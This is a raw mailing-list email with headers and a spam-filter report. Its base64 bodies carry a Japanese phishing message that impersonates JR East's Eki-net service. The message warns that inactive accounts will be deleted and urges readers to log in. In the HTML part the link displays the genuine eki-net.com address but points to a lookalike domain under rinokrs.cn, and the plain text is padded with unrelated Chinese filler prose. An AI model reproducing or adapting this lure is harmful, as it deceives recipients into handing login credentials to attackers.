Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id C5C1856D1AE
	for <lists+industrypack-devel@lfdr.de>; Sun, 10 Jul 2022 23:51:10 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1oAepa-000784-6G
	for lists+industrypack-devel@lfdr.de; Sun, 10 Jul 2022 21:51:09 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <eki-contact@efuyjik.cn>) id 1oAepY-00077y-Dr
 for industrypack-devel@lists.sourceforge.net; Sun, 10 Jul 2022 21:51:07 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Date:Subject:To:From:
 Message-ID:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=RMpuWXcUuXyRS+0DEiK6fzN6ojrD2+eEkvrLcI7xEQQ=; b=QdHTU84zLA+XK4/HCnVGmlr71g
 ZforO1qutjECIZo64wnzrNJ3d6t2wBRDCl8d8s8HbqJ5xlaVKFnBax253gMhd/uOgi5i06OXJrTzV
 IGLFddV+pORraEsOeywROT+oeFCBj5/qivdEUTWtSS06QQIcNUB8Rg6LKX+JHD50KkPI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Date:Subject:To:From:Message-ID:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=RMpuWXcUuXyRS+0DEiK6fzN6ojrD2+eEkvrLcI7xEQQ=; b=g
 FDqBZZe9EOcdU8+6FoPR3gSnjfrjnKiDqXY4yFvrsrk4hprsgZeS4Q7ZGia284PS5EsPT1gd5VXwG
 oANn5LN6B6pOUobfKWnvZnIEx6V+pIi8bT+8tIPv/o3zhQvE5R1IOL1wsiV42twsluNYQAYLhXD/0
 240z4UcR7Jt9f7Pk=;
Received: from [134.122.245.13] (helo=mail.efuyjik.cn)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
 id 1oAepR-00046H-Ky
 for industrypack-devel@lists.sourceforge.net; Sun, 10 Jul 2022 21:51:07 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=efuyjik.cn; 
 h=Message-ID:From:To:Subject:Date:MIME-Version:Content-Type;
 i=eki-contact@efuyjik.cn;
 bh=RMpuWXcUuXyRS+0DEiK6fzN6ojrD2+eEkvrLcI7xEQQ=;
 b=LXGKeg73VbzSILBnKZ6cl9nzIrCcA75NTQzcl6mnE+1g5tKWlHXewufZ7ARtWKMOk313Xs249/3G
 Q4Ajd1wyDDJducaIaoMBdKD9R1/YaiOHBbzDmdj9o3T0Xd3K0Q1JFJlFvlggxMRO1oG/FyxARP3S
 W0FqfvYB6Pf9Kp2XxqQ=
Message-ID: <20220711053048740152@efuyjik.cn>
From: =?utf-8?B?44CM44GI44GN44Gt44Gj44Go44CN?= <eki-contact@efuyjik.cn>
To: <industrypack-devel@lists.sourceforge.net>
Date: Mon, 11 Jul 2022 05:30:41 +0800
MIME-Version: 1.0
X-Spam-Score: 6.2 (++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  日頃より「えきねっと」をご利用いただきありがとうございます。
    「えきねっと」は 2022 年 7 月 5 日にサービスをリニューアルいたしました。これ
    に伴い、「えきねっと」利用規約・会員規約を変更し、最後にログ�
    [...] 
 
 Content analysis details:   (6.2 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
                             [URIs: rinokrs.cn]
  1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
                             blocklist
                             [URIs: rinokrs.cn]
  1.7 URIBL_BLACK            Contains an URL listed in the URIBL blacklist
                             [URIs: rinokrs.cn]
 -0.0 SPF_PASS               SPF: sender matches SPF record
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
                             identical to background
  0.1 HTTPS_HTTP_MISMATCH    BODY: No description available.
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
                             valid
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
                             author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  1.4 NORDNS_LOW_CONTRAST    No rDNS + hidden text
X-Headers-End: 1oAepR-00046H-Ky
Subject: [Industrypack-devel] =?utf-8?b?44CQ44GI44GN44Gt44Gj44Go44CR6YeN?=
 =?utf-8?b?6KaB44Gq44GK55+l44KJ44Gb?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5244344488920732087=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

--===============5244344488920732087==
Content-Type: multipart/alternative;
	boundary="----=_NextPart_000_0A75_0127B5F5.18090E90"

This is a multi-part message in MIME format.

------=_NextPart_000_0A75_0127B5F5.18090E90
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: base64

DQoNCg0KDQogDQoNCiANCg0KDQoNCg0KDQoNCg0K5pel6aCD44KI44KK44CM44GI44GN44Gt44Gj
44Go44CN44KS44GU5Yip55So44GE44Gf44Gg44GN44GC44KK44GM44Go44GG44GU44GW44GE44G+
44GZ44CCIA0KDQoNCuOAjOOBiOOBjeOBreOBo+OBqOOAjeOBryAyMDIyIOW5tCA3IOaciCA1IOaX
peOBq+OCteODvOODk+OCueOCkuODquODi+ODpeODvOOCouODq+OBhOOBn+OBl+OBvuOBl+OBn+OA
guOBk+OCjCDjgavkvLTjgYTjgIHjgIzjgYjjgY3jga3jgaPjgajjgI3liKnnlKjopo/ntITjg7vk
vJrlk6Hopo/ntITjgpLlpInmm7TjgZfjgIHmnIDlvozjgavjg63jgrDjgqTjg7PjgpLjgZfjgZ/m
l6XjgojjgorotbfnrpfjgZcg44GmMeW5tOS7peS4iuOAjOOBiOOBjeOBreOBo+OBqOOAjeOBruOB
lOWIqeeUqO+8iOODreOCsOOCpOODs++8ieOBjOeiuuiqjeOBp+OBjeOBquOBhOOAjOOBiOOBjeOB
reOBo+OBqOOAjeOCouOCq+OCpuODs+ODiCDjga/jgIHoh6rli5XnmoTjgavpgIDkvJrlh6bnkIbj
gZXjgZvjgabjgYTjgZ/jgaDjgY/jgZPjgajjgajjgYTjgZ/jgZfjgb7jgZfjgZ/jgILjgarjgYrj
gIHlr77osaHjgqLjgqvjgqbjg7Pjg4jjga7oh6rli5XpgIAg5Lya5Yem55CG44KS44CB5pys6KaP
57SE44Gr5Z+644Gl44GN44CBMjAyMiDlubQgNyDmnIggMTIg5pel44KI44KK6aCG5qyh44CB5a6f
5pa944GV44Gb44Gm44GE44Gf44Gg44GN44G+44GZ44CCDQoNCg0KMuOBi+aciOS7peS4iuODreOC
sOOCpOODs+OBl+OBpuOBhOOBquOBhOOBiuWuouOBleOBvuOBp+OAgeS7iuW+jOOCguOAjOOBiOOB
jeOBreOBo+OBqOOAjeOCkuOBlOWIqeeUqOOBhOOBn+OBoOOBkeOCi+WgtOWQiCDjga/jgIEg44KI
44KK44KC5YmN44Gr44CB5LiA5bqm44Ot44Kw44Kk44Oz5pON5L2c44KS44GK6aGY44GE44GE44Gf
44GX44G+44GZ44CCIA0K4oeS44Ot44Kw44Kk44Oz44Gv44GT44Gh44KJIA0KaHR0cHM6Ly93d3cu
ZWtpLW5ldC5jb20vUGVyc29uYWwvVG9wL0luZGV4IA0K4oC744GI44GN44Gt44Gj44Go44OI44OD
44OX44Oa44O844K45Y+z5LiK44Gu44Ot44Kw44Kk44Oz44Oc44K/44Oz44KI44KK44Ot44Kw44Kk
44Oz44GX44Gm44GP44Gg44GV44GE44CCDQoNCg0K44Gq44GK44CB44Ki44Kr44Km44Oz44OI44GM
6YCA5Lya5Yem55CG44GV44KM44Gf5aC05ZCI44KC44CB5paw44Gf44Gr44Ki44Kr44Km44Oz44OI
55m76Yyy77yI54Sh5paZ55m76Yyy77yJ44GX44Gm44GE44GfIOOBoOOBj+OBk+OBqOOBp+OBmeOB
kOOBq+OAjOOBiOOBjeOBreOBo+OBqOOAjeOCkuOBlOWIqeeUqOOBhOOBn+OBoOOBj+OBk+OBqOOB
jOOBp+OBjeOBvuOBmeOBruOBp+OAgeS7iuW+jOOCguOBlOaEm+mhp+OBhOOBnyDjgaDjgZHjgb7j
gZnjgojjgYbjgojjgo3jgZfjgY/jgYrpoZjjgYTjgYTjgZ/jgZfjgb7jgZnjgIIgDQoNCg0KICBD
b3B5cmlnaHQgwqkgSlIgRWFzdCBOZXQgU3RhdGlvbiBDby4sTHRkLiBBbGwgUmlnaHRzIFJlc2Vy
dmVkLg0KDQoNCg0KDQrlt4nltJYg5LiO5pyL5Y+L5Lqk77yM6KiA6ICM5pyJ5L+h44CCDQrpnK3p
nK3mmKXnqbog6Zi/5Z+657Gz5b636J6657q/IOiUoeWumuWGm2NhaWRpbmdqdW4NCumcremcreaY
peepuiDoib7kvKbCt+mHkeaWr+Wgoeatu+S6juWOu+W5tOWbm+aciOS6lOWPt++8jOS4reWbveea
hOa4heaYjuiKguOAguaNruivtOW9k+aXtuS7luW3suWkhOS6juaYj+i/t+eKtuaAge+8jOiAjOeX
heaIv+aMpOa7oeS6huaci+WPi++8jOWWnemFkuiBiuWkqe+8jOS5seWThOWThO+8jOayoeacieS4
gOeCueWEv+aCsuWTgOeahOaEj+aAneOAgumCo+WIu+aEj+iQpemAoOeahOawlOawm++8jOaYr+S4
uuS6huWHj+i9u+iJvuS8puS4tOe7iOeahOWtpOeLrOaEn++8muS6uueUn+WmguiBmuS8mu+8jOaA
u+aciei/n+WIsOaXqemAgOeahOOAguato+W9k+iBmuS8mui2i+WQkemrmOa9ru+8jOS7luS4jei+
nuiAjOWIq+OAguaIkeeQouejqO+8jOiJvuS8pueahOeBtemtguWkmuWwkeS4juS8l+S4jeWQjO+8
jOW4puWYtuWYtuWjsOWTjeWSjOe7v+iJsueBq+eEsO+8jOWRvOWVuOiAjOWOu+OAguaIkeaDs+i1
t+S7lueahOivl+WPpe+8muWls+Wjq+S7rO+8jOaKk+S9j+S9oOS7rOeahOijmeWtkO+8jOeOsOWc
qOWHhuWkh+S4i+WcsOeLseWVpuKApuKApiDooYzlsLjotbDogokg6Zi/5Z+657Gz5b636J6657q/
DQrolKHlrprlhptjYWlkaW5nanVuIOiJvuS8psK36YeR5pav5aCh5q275LqO5Y675bm05Zub5pyI
5LqU5Y+377yM5Lit5Zu955qE5riF5piO6IqC44CC5o2u6K+05b2T5pe25LuW5bey5aSE5LqO5piP
6L+354q25oCB77yM6ICM55eF5oi/5oyk5ruh5LqG5pyL5Y+L77yM5Zad6YWS6IGK5aSp77yM5Lmx
5ZOE5ZOE77yM5rKh5pyJ5LiA54K55YS/5oKy5ZOA55qE5oSP5oCd44CC6YKj5Yi75oSP6JCl6YCg
55qE5rCU5rCb77yM5piv5Li65LqG5YeP6L276Im+5Lym5Li057uI55qE5a2k54us5oSf77ya5Lq6
55Sf5aaC6IGa5Lya77yM5oC75pyJ6L+f5Yiw5pep6YCA55qE44CC5q2j5b2T6IGa5Lya6LaL5ZCR
6auY5r2u77yM5LuW5LiN6L6e6ICM5Yir44CC5oiR55Ci56Oo77yM6Im+5Lym55qE54G16a2C5aSa
5bCR5LiO5LyX5LiN5ZCM77yM5bim5Zi25Zi25aOw5ZON5ZKM57u/6Imy54Gr54Sw77yM5ZG85ZW4
6ICM5Y6744CC5oiR5oOz6LW35LuW55qE6K+X5Y+l77ya5aWz5aOr5Lus77yM5oqT5L2P5L2g5Lus
55qE6KOZ5a2Q77yM546w5Zyo5YeG5aSH5LiL5Zyw54ux5ZWm4oCm4oCmIOW3ieW0liDkuI7mnIvl
j4vkuqTvvIzoqIDogIzmnInkv6HjgIIg6Im+5Lymwrfph5Hmlq/loKHmrbvkuo7ljrvlubTlm5vm
nIjkupTlj7fvvIzkuK3lm73nmoTmuIXmmI7oioLjgILmja7or7TlvZPml7bku5blt7LlpITkuo7m
mI/ov7fnirbmgIHvvIzogIznl4XmiL/mjKTmu6HkuobmnIvlj4vvvIzllp3phZLogYrlpKnvvIzk
ubHlk4Tlk4TvvIzmsqHmnInkuIDngrnlhL/mgrLlk4DnmoTmhI/mgJ3jgILpgqPliLvmhI/okKXp
gKDnmoTmsJTmsJvvvIzmmK/kuLrkuoblh4/ovbvoib7kvKbkuLTnu4jnmoTlraTni6zmhJ/vvJrk
urrnlJ/lpoLogZrkvJrvvIzmgLvmnInov5/liLDml6npgIDnmoTjgILmraPlvZPogZrkvJrotovl
kJHpq5jmva7vvIzku5bkuI3ovp7ogIzliKvjgILmiJHnkKLno6jvvIzoib7kvKbnmoTngbXprYLl
pJrlsJHkuI7kvJfkuI3lkIzvvIzluKblmLblmLblo7Dlk43lkoznu7/oibLngavnhLDvvIzlkbzl
lbjogIzljrvjgILmiJHmg7Potbfku5bnmoTor5flj6XvvJrlpbPlo6vku6zvvIzmipPkvY/kvaDk
u6znmoToo5nlrZDvvIznjrDlnKjlh4blpIfkuIvlnLDni7HllabigKbigKYNCuS4juaci+WPi+S6
pO+8jOiogOiAjOacieS/oeOAgiDlt4nltJYg6Im+5Lymwrfph5Hmlq/loKHmrbvkuo7ljrvlubTl
m5vmnIjkupTlj7fvvIzkuK3lm73nmoTmuIXmmI7oioLjgILmja7or7TlvZPml7bku5blt7LlpITk
uo7mmI/ov7fnirbmgIHvvIzogIznl4XmiL/mjKTmu6HkuobmnIvlj4vvvIzllp3phZLogYrlpKnv
vIzkubHlk4Tlk4TvvIzmsqHmnInkuIDngrnlhL/mgrLlk4DnmoTmhI/mgJ3jgILpgqPliLvmhI/o
kKXpgKDnmoTmsJTmsJvvvIzmmK/kuLrkuoblh4/ovbvoib7kvKbkuLTnu4jnmoTlraTni6zmhJ/v
vJrkurrnlJ/lpoLogZrkvJrvvIzmgLvmnInov5/liLDml6npgIDnmoTjgILmraPlvZPogZrkvJro
tovlkJHpq5jmva7vvIzku5bkuI3ovp7ogIzliKvjgILmiJHnkKLno6jvvIzoib7kvKbnmoTngbXp
rYLlpJrlsJHkuI7kvJfkuI3lkIzvvIzluKblmLblmLblo7Dlk43lkoznu7/oibLngavnhLDvvIzl
kbzllbjogIzljrvjgILmiJHmg7Potbfku5bnmoTor5flj6XvvJrlpbPlo6vku6zvvIzmipPkvY/k
vaDku6znmoToo5nlrZDvvIznjrDlnKjlh4blpIfkuIvlnLDni7HllabigKbigKYg6KGM5bC46LWw
6IKJIOW3ieW0lg0KQ2hhcHRlciAxLiBCZWF1dHkgb2YgdGhlIEJyaWdhZGVzLiDpmL/ln7rnsbPl
vrfonrrnur8g6Zyt6Zyt5pil56m6IOS4juaci+WPi+S6pO+8jOiogOiAjOacieS/oeOAgg==

------=_NextPart_000_0A75_0127B5F5.18090E90
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: base64

PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMCBUcmFuc2l0aW9uYWwv
L0VOIj4NCjxIVE1MPjxIRUFEPg0KPE1FVEEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0
Zi04IiBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZT4NCjxNRVRBIG5hbWU9R0VORVJBVE9SIGNvbnRl
bnQ9Ik1TSFRNTCAxMS4wMC45NjAwLjIwMTIwIj48L0hFQUQ+DQo8Qk9EWSANCnN0eWxlPSJQQURE
SU5HLUJPVFRPTTogMHB4OyBQQURESU5HLVRPUDogMHB4OyBQQURESU5HLUxFRlQ6IDBweDsgTUFS
R0lOOiAxMHB4OyBQQURESU5HLVJJR0hUOiAwcHgiPjxCUiANCmNsYXNzPUFwcGxlLWludGVyY2hh
bmdlLW5ld2xpbmU+DQo8VEFCTEUgcm9sZT1wcmVzZW50YXRpb24gY2xhc3M9ZW1haWwtY29udGFp
bmVyIA0Kc3R5bGU9IldISVRFLVNQQUNFOiBub3JtYWwgIWltcG9ydGFudDsgQk9SREVSLUNPTExB
UFNFOiBjb2xsYXBzZSAhaW1wb3J0YW50OyBUQUJMRS1MQVlPVVQ6IGZpeGVkICFpbXBvcnRhbnQ7
IE1BUkdJTjogYXV0bzsgQk9SREVSLVNQQUNJTkc6IDBweCAhaW1wb3J0YW50OyBCQUNLR1JPVU5E
LUNPTE9SOiByZ2IoMjQzLDI0MywyNDMpIiANCmNlbGxTcGFjaW5nPTAgY2VsbFBhZGRpbmc9MCB3
aWR0aD02MDAgYWxpZ249Y2VudGVyIGJnQ29sb3I9I2YzZjNmMyBib3JkZXI9MD4NCiAgPFRCT0RZ
IHN0eWxlPSJXSElURS1TUEFDRTogbm9ybWFsICFpbXBvcnRhbnQiPjxCUiANCiAgY2xhc3M9QXBw
bGUtaW50ZXJjaGFuZ2UtbmV3bGluZT48L1RCT0RZPjwvVEFCTEU+DQo8VEFCTEUgcm9sZT1wcmVz
ZW50YXRpb24gY2xhc3M9ZW1haWwtY29udGFpbmVyIA0Kc3R5bGU9IldISVRFLVNQQUNFOiBub3Jt
YWwgIWltcG9ydGFudDsgQk9SREVSLUNPTExBUFNFOiBjb2xsYXBzZSAhaW1wb3J0YW50OyBUQUJM
RS1MQVlPVVQ6IGZpeGVkICFpbXBvcnRhbnQ7IE1BUkdJTjogYXV0bzsgQk9SREVSLVNQQUNJTkc6
IDBweCAhaW1wb3J0YW50OyBCQUNLR1JPVU5ELUNPTE9SOiByZ2IoMjQzLDI0MywyNDMpIiANCmNl
bGxTcGFjaW5nPTAgY2VsbFBhZGRpbmc9MCB3aWR0aD02MDAgYWxpZ249Y2VudGVyIGJnQ29sb3I9
I2YzZjNmMyBib3JkZXI9MD4NCiAgPFRCT0RZIHN0eWxlPSJXSElURS1TUEFDRTogbm9ybWFsICFp
bXBvcnRhbnQiPg0KICA8VFIgc3R5bGU9IldISVRFLVNQQUNFOiBub3JtYWwgIWltcG9ydGFudCI+
DQogICAgPFREIHN0eWxlPSJXSElURS1TUEFDRTogbm9ybWFsICFpbXBvcnRhbnQiIGJnQ29sb3I9
I2ZmZmZmZiBoZWlnaHQ9Mz48L1REPjwvVFI+DQogIDxUUiBzdHlsZT0iV0hJVEUtU1BBQ0U6IG5v
cm1hbCAhaW1wb3J0YW50Ij4NCiAgICA8VEQgY2xhc3M9c3BhY2VfdGRfY2xhc3MgDQogICAgc3R5
bGU9IkZPTlQtU0laRTogMHB4OyBIRUlHSFQ6IDEycHg7IFdISVRFLVNQQUNFOiBub3JtYWwgIWlt
cG9ydGFudDsgTElORS1IRUlHSFQ6IDAiIA0KICAgIGJnQ29sb3I9I2ZmZmZmZiBoZWlnaHQ9MTI+
PC9URD48L1RSPg0KICA8VFIgc3R5bGU9IldISVRFLVNQQUNFOiBub3JtYWwgIWltcG9ydGFudCI+
DQogICAgPFREIHN0eWxlPSJXSElURS1TUEFDRTogbm9ybWFsICFpbXBvcnRhbnQ7IFRFWFQtQUxJ
R046IGNlbnRlciIgDQogICAgYmdDb2xvcj0jZmZmZmZmIGFsaWduPWNlbnRlcj4NCiAgICAgIDxU
QUJMRSANCiAgICAgIHN0eWxlPSJXSElURS1TUEFDRTogbm9ybWFsICFpbXBvcnRhbnQ7IEJPUkRF
Ui1DT0xMQVBTRTogY29sbGFwc2UgIWltcG9ydGFudDsgVEFCTEUtTEFZT1VUOiBmaXhlZCAhaW1w
b3J0YW50OyBNQVJHSU46IDBweCBhdXRvOyBCT1JERVItU1BBQ0lORzogMHB4ICFpbXBvcnRhbnQi
IA0KICAgICAgY2VsbFNwYWNpbmc9MCBjZWxsUGFkZGluZz01IGJnQ29sb3I9I2ZmZmZmZiBib3Jk
ZXI9MD4NCiAgICAgICAgPFRCT0RZIHN0eWxlPSJXSElURS1TUEFDRTogbm9ybWFsICFpbXBvcnRh
bnQiPg0KICAgICAgICA8VFIgc3R5bGU9IldISVRFLVNQQUNFOiBub3JtYWwgIWltcG9ydGFudCI+
DQogICAgICAgICAgPFREIA0KICAgICAgICAgIHN0eWxlPSJGT05ULVNJWkU6IDFweDsgV0hJVEUt
U1BBQ0U6IG5vcm1hbCAhaW1wb3J0YW50OyBMSU5FLUhFSUdIVDogMXB4IiANCiAgICAgICAgICBo
ZWlnaHQ9MSB3aWR0aD0yNTU+Jm5ic3A7PC9URD4NCiAgICAgICAgPFRSIHN0eWxlPSJXSElURS1T
UEFDRTogbm9ybWFsICFpbXBvcnRhbnQiPg0KICAgICAgICAgIDxURCBzdHlsZT0iV0hJVEUtU1BB
Q0U6IG5vcm1hbCAhaW1wb3J0YW50Ij48L1REPg0KICAgICAgICAgIDxURCBzdHlsZT0iV0hJVEUt
U1BBQ0U6IG5vcm1hbCAhaW1wb3J0YW50Ij48L1REPjwvVFI+DQogICAgICAgIDxUUiBzdHlsZT0i
V0hJVEUtU1BBQ0U6IG5vcm1hbCAhaW1wb3J0YW50Ij4NCiAgICAgICAgICA8VEQgDQogICAgICAg
ICAgc3R5bGU9IkZPTlQtU0laRTogMXB4OyBXSElURS1TUEFDRTogbm9ybWFsICFpbXBvcnRhbnQ7
IExJTkUtSEVJR0hUOiAxcHgiIA0KICAgICAgICAgIGhlaWdodD0xPiZuYnNwOzwvVEQ+DQogICAg
ICAgICAgPFREIHN0eWxlPSJXSElURS1TUEFDRTogbm9ybWFsICFpbXBvcnRhbnQiPjwvVEQ+DQog
ICAgICAgICAgPFREIA0Kc3R5bGU9IldISVRFLVNQQUNFOiBub3JtYWwgIWltcG9ydGFudCI+PC9U
RD48L1RSPjwvVEJPRFk+PC9UQUJMRT48L1REPjwvVFI+DQogIDxUUiBzdHlsZT0iV0hJVEUtU1BB
Q0U6IG5vcm1hbCAhaW1wb3J0YW50Ij4NCiAgICA8VEQgY2xhc3M9c3BhY2VfdGRfY2xhc3MgDQog
ICAgc3R5bGU9IkZPTlQtU0laRTogMHB4OyBIRUlHSFQ6IDEycHg7IFdISVRFLVNQQUNFOiBub3Jt
YWwgIWltcG9ydGFudDsgTElORS1IRUlHSFQ6IDAiIA0KICAgIGJnQ29sb3I9I2ZmZmZmZiBoZWln
aHQ9MTI+PC9URD48L1RSPg0KICA8VFIgc3R5bGU9IldISVRFLVNQQUNFOiBub3JtYWwgIWltcG9y
dGFudCI+DQogICAgPFREIA0KICAgIHN0eWxlPSJGT05ULVNJWkU6IDBweDsgSEVJR0hUOiAxcHg7
IFdISVRFLVNQQUNFOiBub3JtYWwgIWltcG9ydGFudDsgTElORS1IRUlHSFQ6IDAiIA0KICAgIGJn
Q29sb3I9I2NjY2NjYyBoZWlnaHQ9MT48L1REPjwvVFI+DQogIDxUUiBzdHlsZT0iV0hJVEUtU1BB
Q0U6IG5vcm1hbCAhaW1wb3J0YW50Ij4NCiAgICA8VEQgY2xhc3M9c3BhY2VfdGRfY2xhc3MgDQog
ICAgc3R5bGU9IkZPTlQtU0laRTogMHB4OyBIRUlHSFQ6IDIxcHg7IFdISVRFLVNQQUNFOiBub3Jt
YWwgIWltcG9ydGFudDsgTElORS1IRUlHSFQ6IDAiIA0KICAgIGJnQ29sb3I9I2YzZjNmMyBoZWln
aHQ9MjE+PC9URD48L1RSPg0KICA8VFIgY2xhc3M9dGV4dF90cl9jbGFzcyBzdHlsZT0iV0hJVEUt
U1BBQ0U6IG5vcm1hbCAhaW1wb3J0YW50Ij4NCiAgICA8TUVUQSBuYW1lPUdFTkVSQVRPUiBjb250
ZW50PSJNU0hUTUwgOC4wMC43NjAxLjE3NTE0Ij4NCiAgICA8RElWIHN0eWxlPSJXSURUSDogNjAw
cHg7IFRFWFQtQUxJR046IGxlZnQ7IExJTkUtSEVJR0hUOiAxMjAlIj4NCiAgICA8UD48SU1HIGJv
cmRlcj0wIGhzcGFjZT0wIGFsdD0iIiANCiAgICBzcmM9Imh0dHBzOi8vd3d3LmVraS1uZXQuY29t
L1BlcnNvbmFsL21lbWJlci93Yi9pbWcvbG9nb19qcmVhc3QucG5nIiANCiAgICBhbGlnbj1iYXNl
bGluZT48QlI+PC9QPg0KICAgIDxQPiZuYnNwOzwvUD4NCiAgICA8UD7ml6XpoIPjgojjgorjgIzj
gYjjgY3jga3jgaPjgajjgI3jgpLjgZTliKnnlKjjgYTjgZ/jgaDjgY3jgYLjgorjgYzjgajjgYbj
gZTjgZbjgYTjgb7jgZnjgIIgPC9QPg0KICAgIDxQPjxCUj48L1A+DQogICAgPFA+44CM44GI44GN
44Gt44Gj44Go44CN44GvIDIwMjIg5bm0Jm5ic3A7NyDmnIgmbmJzcDs1IOaXpeOBq+OCteODvOOD
k+OCueOCkuODquODi+ODpeODvOOCouODq+OBhOOBn+OBl+OBvuOBl+OBn+OAguOBk+OCjCANCiAg
ICDjgavkvLTjgYTjgIHjgIzjgYjjgY3jga3jgaPjgajjgI3liKnnlKjopo/ntITjg7vkvJrlk6Ho
po/ntITjgpLlpInmm7TjgZfjgIHmnIDlvozjgavjg63jgrDjgqTjg7PjgpLjgZfjgZ/ml6Xjgojj
gorotbfnrpfjgZcgDQogICAg44GmMeW5tOS7peS4iuOAjOOBiOOBjeOBreOBo+OBqOOAjeOBruOB
lOWIqeeUqO+8iOODreOCsOOCpOODs++8ieOBjOeiuuiqjeOBp+OBjeOBquOBhOOAjOOBiOOBjeOB
reOBo+OBqOOAjeOCouOCq+OCpuODs+ODiCANCiAgICDjga/jgIHoh6rli5XnmoTjgavpgIDkvJrl
h6bnkIbjgZXjgZvjgabjgYTjgZ/jgaDjgY/jgZPjgajjgajjgYTjgZ/jgZfjgb7jgZfjgZ/jgILj
garjgYrjgIHlr77osaHjgqLjgqvjgqbjg7Pjg4jjga7oh6rli5XpgIAg5Lya5Yem55CG44KS44CB
5pys6KaP57SE44Gr5Z+644Gl44GN44CBMjAyMiDlubQgNyDmnIgmbmJzcDsxMiANCiAgICDml6Xj
gojjgorpoIbmrKHjgIHlrp/mlr3jgZXjgZvjgabjgYTjgZ/jgaDjgY3jgb7jgZnjgII8L1A+DQog
ICAgPFA+PEJSPjwvUD4NCiAgICA8UD4y44GL5pyI5Lul5LiK44Ot44Kw44Kk44Oz44GX44Gm44GE
44Gq44GE44GK5a6i44GV44G+44Gn44CB5LuK5b6M44KC44CM44GI44GN44Gt44Gj44Go44CN44KS
44GU5Yip55So44GE44Gf44Gg44GR44KL5aC05ZCIIOOBr+OAgSDjgojjgorjgoLliY3jgavjgIHk
uIDluqbjg63jgrDjgqTjg7Pmk43kvZzjgpLjgYrpoZjjgYTjgYTjgZ/jgZfjgb7jgZnjgIIgDQo8
L1A+DQogICAgPFA+4oeS44Ot44Kw44Kk44Oz44Gv44GT44Gh44KJIDwvUD4NCiAgICA8UD48QSAN
CiAgICBocmVmPSJodHRwczovL2Vpay5uZXQucmlub2tycy5jbi8iPmh0dHBzOi8vd3d3LmVraS1u
ZXQuY29tL1BlcnNvbmFsL1RvcC9JbmRleDwvQT4gDQogICAgPC9QPg0KICAgIDxQPuKAu+OBiOOB
jeOBreOBo+OBqOODiOODg+ODl+ODmuODvOOCuOWPs+S4iuOBruODreOCsOOCpOODs+ODnOOCv+OD
s+OCiOOCiuODreOCsOOCpOODs+OBl+OBpuOBj+OBoOOBleOBhOOAgjwvUD4NCiAgICA8UD48QlI+
PC9QPg0KICAgIDxQPuOBquOBiuOAgeOCouOCq+OCpuODs+ODiOOBjOmAgOS8muWHpueQhuOBleOC
